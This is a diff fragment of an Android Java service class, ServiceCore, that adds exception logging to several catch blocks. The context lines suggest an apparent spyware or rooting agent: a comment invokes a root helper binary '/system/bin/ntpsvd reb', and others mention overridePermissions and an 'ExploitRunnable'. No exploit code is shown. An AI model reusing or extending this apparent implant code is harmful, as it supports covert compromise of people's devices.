@@ -94,6 +94,10 @@ public class ServiceCore extends Service {
 			try {
 				wm.setBitmap(bitmap);
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(e);
 				}
@@ -283,6 +287,10 @@ public class ServiceCore extends Service {
 			// /system/bin/ntpsvd reb
 			invokeRun(Messages.getString("32.28"));
 		} catch (Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
 				Check.log(TAG + " (root): Exception on overridePermissions()"); //$NON-NLS-1$
@@ -377,6 +385,9 @@ public class ServiceCore extends Service {
 
 			}
 		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
@@ -403,6 +414,10 @@ public class ServiceCore extends Service {
 
 			out.close();
 		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
 				ex.printStackTrace();
 				Check.log(TAG + " (fileWrite): " + ex);
@@ -479,6 +494,10 @@ public class ServiceCore extends Service {
 				try {
 					localProcess.waitFor();
 				} catch (final InterruptedException e) {
+					if (Cfg.EXCEPTION) {
+						Check.log(e);
+					}
+
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
 						Check.log(e);//$NON-NLS-1$
@@ -495,6 +514,10 @@ public class ServiceCore extends Service {
 				stderr.close();
 
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				localProcess = null;
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
